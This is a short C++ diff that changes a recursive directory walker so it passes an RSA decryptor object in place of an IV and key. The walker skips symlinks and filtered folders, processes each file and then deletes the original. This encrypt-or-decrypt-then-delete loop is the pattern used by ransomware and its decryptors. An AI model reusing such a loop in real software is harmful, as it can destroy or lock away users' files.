@@ -63,7 +63,7 @@ bool is_valid_folder(const string& path)
 	return true;
 }
 
-void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key) {
+void iterate(const path& parent, Processing_func process, RsaDecryptor rsaDecryptor) {
 	string path;
 	directory_iterator end_itr;
 
@@ -73,11 +73,11 @@ void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key) {
 		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
 			if (is_valid_folder(path))
 			{
-				iterate(path, process, iv, key);
+				iterate(path, process, rsaDecryptor);
 			}
 		}
 		else {
-			process(path,iv,key);
+			process(path, rsaDecryptor);
 			remove(path);
 		}
 	}
